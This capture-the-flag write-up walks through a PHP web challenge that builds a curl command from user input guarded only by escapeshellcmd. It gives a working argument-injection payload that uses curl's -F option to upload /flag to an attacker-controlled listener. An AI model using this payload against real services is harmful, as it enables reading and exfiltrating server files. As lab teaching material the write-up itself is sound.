Looking at the name of the challenge name, I suspect it has something to do with `curl`. Which could be vulnerable to _command injection_. However, let's check the source code before making any assumption. (\* ^ ω ^)

The webpage looks like some sort of service using presumably `curl` to query IP addresses:

## Vulnerability
Let's take a look at `CurlController.php`:
```php
<?php
class CurlController
{
    public function index($router)
    {
        return $router->view('index');
    }

    public function execute($router)
    {
        $url = $_POST['ip'];

        if (isset($url)) {
            $command = new CommandModel($url);
            return json_encode([ 'message' => $command->exec() ]);
        }
    }
}
```
It takes an `ip` from the body without any sanitization and creates a new Command Model, so let’s check what the file `CommandModel.php` does:
```php
<?php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
}
```
Ok, we have a main point of interest. We can see that constructor builds the `curl` command from the input parameter.

We can’t inject arbitrary commands to this because of the [escapeshellcmd](https://www.php.net/manual/en/function.escapeshellcmd.php) function but we can add arbitrary parameters. Looking at the [curl manual pages](https://curl.se/docs/manpage.html) I quickly found the -F option to exfiltrate a file. There is also this [cheatsheet](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#curl) which shows how you can bypass the escapeshellcmd function.
## Exploitation
With that information, we can simply request the flag and send it to our host machine. Type the following command after setting up a nc listener on port 6666:
```bash
curl -d "ip=-F flag=@/flag http://[MY-IP]:6666/" http://[DOCKER-IP]/api/curl
```
We receive the flag:
